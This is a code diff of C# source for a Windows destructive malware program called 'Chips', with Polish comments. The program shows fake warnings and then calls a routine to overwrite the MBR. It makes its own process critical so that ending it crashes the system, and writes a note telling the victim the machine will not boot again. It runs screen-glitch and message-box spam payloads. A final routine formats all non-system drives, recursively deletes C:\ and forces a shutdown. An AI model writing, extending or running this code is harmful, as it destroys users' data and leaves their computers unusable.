@@ -8,11 +8,10 @@ using System.Text;
 using System.IO;
 using System.Collections.Generic;
 
-namespace IdiotMalware
+namespace ChipsMalware
 {
     class Program
     {
-        // --- API IMPORT ---
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -27,15 +26,12 @@ namespace IdiotMalware
         static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
         [DllImport("shell32.dll", CharSet = CharSet.Auto)]
         static extern IntPtr ExtractIcon(IntPtr hInst, string lpszExeFileName, int nIconIndex);
-        
-        // --- IMPORT DLA JĘZYKA ARABSKIEGO (RTL) ---
         [DllImport("user32.dll")]
         static extern bool SetProcessDefaultLayout(uint dwDefaultLayout);
 
         static Random rnd = new Random();
         static List<Form> trail = new List<Form>();
         static string[] msgTexts = { "Chips are coming", "RUN", "Idiot", "Lol", "Really?" };
-        static string[] zlosliweStrony = { "https://www.google.com/search?q=how+to+fix+a+virus", "https://www.youtube.com/watch?v=dQw4w9WgXcQ" };
 
         [STAThread]
         static void Main(string[] args)
@@ -46,27 +42,26 @@ namespace IdiotMalware
             if (MessageBox.Show("LAST WARNING.", "STOP", MessageBoxButtons.YesNo, (MessageBoxIcon)16) != DialogResult.Yes) return;
 
             OverwriteMBR();
-            OpenNotePad();
+            OpenNotePad(); // Wywołanie poprawionego notatnika
 
             int isCritical = 1;
             try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int)); } catch { }
 
-            // --- AKTYWACJA JĘZYKA ARABSKIEGO (Wszystko od prawej do lewej) ---
-            SetProcessDefaultLayout(1); 
+            SetProcessDefaultLayout(1); // Arabski
 
             new Thread(DirectorThread).Start();
 
-            // NIEKOŃCZĄCY SIĘ OGON IKON
-            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 15 };
+            // DROPPING TRAIL - IKONY BEZ KÓŁEK
+            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer { Interval = 20 };
             t.Tick += (s, e) => {
-                Point target = Cursor.Position;
+                Point pos = Cursor.Position;
                 Form f = new Form { FormBorderStyle = FormBorderStyle.None, Size = new Size(32, 32), BackColor = Color.Magenta, TransparencyKey = Color.Magenta, TopMost = true, ShowInTaskbar = false, StartPosition = FormStartPosition.Manual };
                 PictureBox pb = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.StretchImage };
-                int[] memzIcons = { 3, 4, 10, 15, 235, 240, 47 }; 
+                int[] memzIcons = { 3, 4, 10, 15, 23, 47, 240, 248 }; 
                 IntPtr hIcon = ExtractIcon(IntPtr.Zero, "shell32.dll", memzIcons[rnd.Next(memzIcons.Length)]);
                 if (hIcon != IntPtr.Zero) pb.Image = Icon.FromHandle(hIcon).ToBitmap();
                 f.Controls.Add(pb);
-                f.Location = new Point(target.X + rnd.Next(-10, 11), target.Y + rnd.Next(-10, 11));
+                f.Location = new Point(pos.X + rnd.Next(-10, 11), pos.Y + rnd.Next(-10, 11));
                 f.Show();
                 trail.Add(f);
             };
@@ -80,38 +75,43 @@ namespace IdiotMalware
             Thread.Sleep(5000); 
             new Thread(Payload_TikTokScroll).Start();
             new Thread(Payload_ScreenShake).Start();
-            
             Thread.Sleep(5000);
-            new Thread(Payload_ColorWorld).Start(); // NOWOŚĆ: Kolorowy świat
-
+            new Thread(Payload_ColorWorld).Start();
             Thread.Sleep(10000);
             new Thread(Payload_Spam_MsgBox).Start();
-            new Thread(Payload_Browser_Terror).Start();
-
             Thread.Sleep(30000);
-            TotalDestruction();
+            TotalDestruction(); 
         }
 
+        // --- POPRAWIONA SEKCJA NOTATNIKA ---
         static void OpenNotePad()
         {
             string path = Path.Combine(Path.GetTempPath(), "READ_ME.txt");
-            string content = "Your computer has been damaged by: Chips.\n\n" +
-                             " Do not attempt to disable the virus process or restart your computer.\n" +
-                             " The computer may still work after shutting down, but once you turn it off, it won't start again because the MBR has been overwritten.\n\n" +
-                             " I and the other authors are not responsible for any damages.";
-            try { File.WriteAllText(path, content); Process.Start("notepad.exe", path); } catch { }
+            
+            // Używamy StringBuilder, żeby wymusić dokładne formatowanie z pustymi liniami
+            StringBuilder sb = new StringBuilder();
+            sb.AppendLine("Your computer has been damaged by: Chips.");
+            sb.AppendLine(""); // Pusta linia
+            sb.AppendLine(" Do not attempt to disable the virus process or restart your computer.");
+            sb.AppendLine(""); // Pusta linia
+            sb.AppendLine(" The computer may still work after shutting down, but once you turn it off, it won't start again because the MBR has been overwritten.");
+            sb.AppendLine(""); // Pusta linia
+            sb.AppendLine(" I and the other authors are not responsible for any damages.");
+
+            try { 
+                File.WriteAllText(path, sb.ToString()); 
+                Process.Start("notepad.exe", path); 
+            } catch { }
         }
 
-        // --- NOWE: KOLOROWY ŚWIAT (Inwersja i GDI Glitch) ---
         static void Payload_ColorWorld()
         {
             IntPtr hdc = GetDC(IntPtr.Zero);
             int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
             while (true)
             {
-                // NOT - Inwersja kolorów
-                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009); 
-                Thread.Sleep(rnd.Next(100, 500));
+                BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009);
+                Thread.Sleep(rnd.Next(200, 800));
             }
         }
 
@@ -123,7 +123,7 @@ namespace IdiotMalware
             {
                 BitBlt(hdc, 0, -30, w, h, hdc, 0, 0, 0x00CC0020);
                 BitBlt(hdc, 0, h - 30, w, 30, hdc, 0, 0, 0x00CC0020);
-                Thread.Sleep(5);
+                Thread.Sleep(5); 
             }
         }
 
@@ -133,7 +133,7 @@ namespace IdiotMalware
             int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
             while (true)
             {
-                BitBlt(hdc, rnd.Next(-50, 51), 0, w, h, hdc, 0, 0, 0x00CC0020);
+                BitBlt(hdc, rnd.Next(-50, 51), rnd.Next(-5, 6), w, h, hdc, 0, 0, 0x00CC0020);
                 Thread.Sleep(10);
             }
         }
@@ -144,15 +144,7 @@ namespace IdiotMalware
             {
                 string txt = msgTexts[rnd.Next(msgTexts.Length)];
                 new Thread(() => { MessageBox.Show(txt, "Idiot", MessageBoxButtons.OK, (MessageBoxIcon)48); }).Start();
-                Thread.Sleep(1500);
-            }
-        }
-
-        static void Payload_Browser_Terror()
-        {
-            while (true) {
-                try { Process.Start(zlosliweStrony[rnd.Next(zlosliweStrony.Length)]); } catch { }
-                Thread.Sleep(20000);
+                Thread.Sleep(1500); 
             }
         }
 
@@ -173,6 +165,9 @@ namespace IdiotMalware
         {
             foreach (DriveInfo d in DriveInfo.GetDrives()) { if (d.IsReady && d.Name != "C:\\") { try { Process.Start("cmd.exe", "/c format " + d.Name.Substring(0, 2) + " /FS:NTFS /Q /Y /X"); } catch { } } }
             try { Process.Start("cmd.exe", "/c del /s /q /f C:\\*.*"); } catch { }
+            
+            // RESET NA KOŃCU
+            Process.Start("shutdown", "-s -t 60 -f -c \"Your computer was eaten by Chips. Bye bye!\"");
         }
     }
 }
